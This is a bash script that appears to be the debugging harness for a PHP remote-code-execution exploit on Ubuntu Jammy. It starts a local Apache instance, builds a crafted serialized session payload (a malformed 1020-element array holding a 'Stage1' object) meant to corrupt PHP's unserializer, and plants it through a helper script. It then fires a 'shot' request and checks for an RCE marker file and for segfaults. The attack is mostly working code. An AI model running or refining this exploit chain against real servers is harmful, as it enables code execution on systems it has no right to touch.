#!/bin/bash
# fa_jammy_debug.sh — focused stage-4 debug: apache up, plant, shot, inspect
ART=$(cd "$(dirname "$0")" && pwd)
ROOT=/tmp/fa_jammy
PORT=18380
URL=http://127.0.0.1:$PORT
SID=fajammy000000000000000000000ab
MARKER=/tmp/fa_jammy_rce
TRIGGER="k|a:1020:{i:0;O:6:\"Stage1\":0:{}"$(python3 -c "
s=''.join('i:%d;i:1;'%i for i in range(1,1019))
print(s,end='')")"i:0;i:5;}"
SESSFILE="$ROOT/sess/sess_$SID"

stop_apache() { for P in $(pgrep -f "apache2 -X -f $ROOT/httpd.conf" 2>/dev/null); do kill -9 "$P" 2>/dev/null; done; sleep 0.5; }

stop_apache
sed -i 's/^LogLevel .*/LogLevel debug/' "$ROOT/httpd.conf"
/usr/sbin/apache2 -X -f "$ROOT/httpd.conf" > "$ROOT/x.log" 2>&1 &
disown
for i in $(seq 1 40); do curl -s -o /dev/null --max-time 2 "$URL/arm_target.php" && break; sleep 0.4; done
echo "apache up: $(curl -s --max-time 3 "$URL/arm_target.php")"

rm -f "$MARKER" /tmp/fa_jammy_diag.log
: > "$SESSFILE"
python3 "$ART/lc_arm.py" plain "$PORT" "$SID" "$TRIGGER" /w/arm_target.php 2>&1 | head -2
sleep 0.5
echo "sess size: $(stat -c%s "$SESSFILE")"
: > "$ROOT/error.log"
echo "--- shot ---"
curl -s -o /tmp/shot_body.txt -w "status:%{http_code} size:%{size_download}\n" \
     --max-time 10 -H "Cookie: PHPSESSID=$SID" "$URL/fa_jammy_reader.php"
echo "--- body (first 400) ---"
head -c 400 /tmp/shot_body.txt; echo
sleep 0.5
echo "marker: $(cat "$MARKER" 2>/dev/null || echo none)"
echo "diag: $(head -8 /tmp/fa_jammy_diag.log 2>/dev/null || echo none)"
echo "--- error.log (php+child lines) ---"
grep -E "Segmentation|signal|child pid|Fatal|stack|PHP" "$ROOT/error.log" | tail -10
echo "--- sess file after shot (first 120) ---"
head -c 120 "$SESSFILE"; echo
stop_apache
